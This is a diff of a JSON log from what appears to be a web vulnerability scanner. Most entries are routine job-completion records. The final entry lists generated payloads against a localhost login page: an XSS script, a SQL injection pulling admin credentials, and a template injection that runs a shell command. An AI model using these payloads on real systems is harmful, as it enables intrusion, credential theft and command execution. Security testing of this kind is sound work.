@@ -1,23 +1,114 @@
 [
   {
-    "timestamp": 1782230503.8571706,
-    "scan_id": "HIVE-V5-184b93896e",
+    "timestamp": 1782320204.270837,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
     "message": "Background job completed",
     "payload": {
-      "job_id": "5fa977aa-2d22-4c1d-89cd-e534ce159c25",
+      "job_id": "c2996298-0a88-49fb-a5a5-6a138bf005dc",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320217.7035644,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "56fa0c0b-1dea-4e87-8527-1993e352afe5",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320223.2510452,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "95844742-1732-4337-9995-104c361ea97e",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320230.023309,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "768b9784-e785-46e7-828b-c5f199901f77",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320235.1635215,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "192cc0bf-ecb8-48ba-8587-09b35d52ba11",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320242.2934558,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "90e8f38f-1dd6-4bf1-8ceb-4a887700e4f1",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320247.7878497,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d1f4dc83-451c-4d35-b9e2-aa28366a54b6",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1782320249.2186944,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ef4275ac-b828-47bd-81ec-6c5fa206ec8c",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1782320250.8179393,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "95eb579f-62e0-4a8f-ac10-cb17a079535c",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1782320251.0435128,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "1e75d6cb-5493-4f1e-ad9d-cb01306dbf3a",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1782320261.3586817,
+    "scan_id": "HIVE-V5-0dd1d55fb5",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "49339b77-2caf-495b-a920-0a1b81c177d0",
       "status": "SUCCESS",
       "target_url": "http://localhost:8080/login.php",
-      "target_headers": {},
       "data": {
         "generated_payloads": [
-          "json",
-          "anNvbg==",
-          "0x6a0x730x6f0x6e",
-          "json",
-          "payloads\": [",
-          "cGF5bG9hZHMiOiBb",
-          "0x700x610x790x6c0x6f0x610x640x730x220x3a0x200x5b",
-          "payloads%22%3A%20%5B"
+          "<script>alert(\"XSS_BY_SIGMA\")</script>",
+          "UNION SELECT admin_creds, password FROM users--",
+          "{{cycler.__init__.__globals__.os.popen(\"id\").read()}}"
         ]
       }
     }
